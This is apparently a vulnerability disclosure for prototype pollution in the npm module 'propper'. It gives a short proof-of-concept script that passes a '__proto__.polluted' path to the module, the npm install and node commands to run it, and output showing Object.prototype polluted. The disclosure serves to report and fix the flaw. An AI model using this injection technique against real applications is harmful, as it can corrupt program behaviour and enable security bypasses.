# Description

Prototype Pollution in propper

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var propper = require("propper")
var obj = {}
console.log("Before : " + {}.polluted);
propper(obj,"__proto__.polluted","Yes! Its Polluted");
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i propper # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
